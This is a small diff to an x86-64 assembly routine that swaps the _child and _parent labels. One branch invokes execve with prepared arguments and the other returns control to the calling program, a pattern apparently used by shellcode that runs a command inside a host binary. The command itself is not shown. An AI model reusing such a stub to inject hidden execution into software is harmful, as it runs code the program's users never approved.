@@ -24,12 +24,12 @@ _start:
   cmove  rcx, rbx ; conditional move rbx to rcx if parent
   jmp    rcx ; jump to rcx
 
-_child:
+_parent:
   add  rsp, 0x48 ; break down stack
   mov  rsp, rbp
   ret ; return to program call
 
-_parent:
+_child:
   mov  rax, 59  ; execve
 
   lea   rcx, [rel arg4] ; push arguments
